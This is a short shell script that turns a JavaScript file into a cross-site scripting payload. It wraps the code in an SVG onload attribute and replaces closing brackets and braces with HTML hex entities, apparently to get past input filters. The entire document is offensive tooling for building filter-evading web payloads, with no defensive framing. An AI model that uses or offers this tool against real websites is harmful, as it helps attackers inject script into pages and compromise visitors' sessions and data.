#!/bin/sh


sed -i  "s/^/<svg\/onload='/g" script.js
sed -ie 's/[)]/\&#X29 /g' script.js
sed -ie 's/[}]/\&#X7D /g' script.js
truncate --size=-1 script.js
echo "'>" >> script.js

cat script.js
